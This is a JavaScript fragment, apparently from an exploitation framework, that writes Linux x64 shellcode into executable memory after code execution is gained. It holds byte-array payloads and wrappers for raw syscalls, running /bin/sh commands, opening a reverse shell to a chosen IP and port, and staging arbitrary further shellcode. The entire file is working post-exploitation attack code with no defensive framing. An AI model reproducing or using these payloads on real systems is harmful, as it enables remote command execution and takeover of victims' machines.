// Export common shellcodes for Linux x64 once code execution is reliable
{
    if (FINGERPRINT.platform.os === "Linux" && FINGERPRINT.platform.arch === "x64") {
        log("[i] Loading Linux x64 shellcodes", 1);


        // Do a system call
        // Build: nasm x64-linux-src/syscall.asm
        let syscall_shellcode = [0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xDA, 0x4D, 0x89, 0xCA, 0x4C, 0x8B, 0x44, 0x24, 0x08, 0x4C, 0x8B, 0x4C, 0x24, 0x10, 0x0F, 0x05, 0xC3];

        function syscall(syscall_number, ...args) {
            log(`[i] Doing a syscall: ${syscall_number}(${args.map(x => "0x"+hex(x))})`, 3);
            let [syscall_rwx, syscall] = getRWX(args.length+1, true);
            writeShellcode(syscall_shellcode, syscall_rwx);
            return syscall(syscall_number, ...args);
        }


        // Run a shell command (in a new process)
        // Return the PID of the child process
        // Build: nasm x64-linux-src/cmd_exec.asm
        let cmd_exec_shellcode = [0x48, 0x31, 0xC0, 0xB0, 0x39, 0x0F, 0x05, 0x48, 0x85, 0xC0, 0x74, 0x0A, 0xC3, 0x56, 0x57, 0x48, 0x89, 0xE6, 0xB0, 0x3B, 0x0F, 0x05, 0x48, 0x31, 0xC0, 0x48, 0x31, 0xD2, 0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x50, 0x57, 0x48, 0x89, 0xE7, 0x50, 0x66, 0x68, 0x2D, 0x63, 0x48, 0x89, 0xE6, 0x50, 0xE8, 0xD4, 0xFF, 0xFF, 0xFF];
        let [cmd_exec_rwx, cmd_exec] = getRWX(0);
        writeShellcode(cmd_exec_shellcode, cmd_exec_rwx);

        function cmdExec(cmd) {
            log(`[i] Running command: "${cmd}"`, 3);
            writeShellcode(stringToArr(cmd), cmd_exec_rwx + BigInt(cmd_exec_shellcode.length));
            return cmd_exec();
        }


        // Setup a reverse shell (in a new process)
        // Return the PID of the child process
        // Build: nasm x64-linux-src/revshell.asm
        let revshell_shellcode = [0x53, 0x48, 0x89, 0xC3, 0x48, 0x31, 0xC0, 0xB0, 0x39, 0x0F, 0x05, 0x48, 0x85, 0xC0, 0x74, 0x02, 0x5B, 0xC3, 0xBF, 0x02, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xD2, 0xB0, 0x29, 0x0F, 0x05, 0x48, 0x97, 0x53, 0x48, 0x89, 0xE6, 0xBA, 0x10, 0x00, 0x00, 0x00, 0xB0, 0x2A, 0x0F, 0x05, 0xBE, 0x03, 0x00, 0x00, 0x00, 0x48, 0xFF, 0xCE, 0xB0, 0x21, 0x0F, 0x05, 0x75, 0xF7, 0x48, 0x31, 0xD2, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 0xB0, 0x3B, 0x0F, 0x05];
        let [revshell_rwx, revshell] = getRWX(1);
        writeShellcode(revshell_shellcode, revshell_rwx);

        function revShell(ip, port) {
            log(`[i] Starting a reverse shell to ${ip}:${port}`, 3);
            let [a, b, c, d] = ip.split('.').map(Number);
            let sockaddr = BigInt((d << 24) | (c << 16) | (b << 8) | a) << 32n | BigInt(((port & 0xff) << 8) | (port >> 8)) << 16n | 2n;
            return revshell(sockaddr);
        }


        // Use stage0 to run a shellcode
        // Shellcode can return a value
        // Build: nasm x64-linux-src/stage0.asm
        let stage0_shellcode = [0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x49, 0x89, 0xC4, 0x49, 0x89, 0xD5, 0x48, 0x31, 0xC0, 0x48, 0x31, 0xFF, 0x4C, 0x89, 0xEE, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x22, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC0, 0x49, 0x89, 0xC1, 0xB0, 0x09, 0x0F, 0x05, 0x49, 0x89, 0xC6, 0x4C, 0x89, 0xF7, 0x4C, 0x89, 0xE9, 0x4C, 0x89, 0xE6, 0xF3, 0xA4, 0x4C, 0x89, 0xF7, 0x4C, 0x89, 0xEE, 0xBA, 0x05, 0x00, 0x00, 0x00, 0xB8, 0x0A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x4C, 0x89, 0xF0, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0xFF, 0xE0];
        let [stage0_rwx, stage0] = getRWX(2);
        writeShellcode(stage0_shellcode, stage0_rwx);

        function stage(shellcode) {
            log("[i] Staging custom shellcode", 3);
            let shellcode_addr = getDataAddr(shellcode);
            return stage0(shellcode_addr, BigInt(shellcode.length));
        }
    }
}
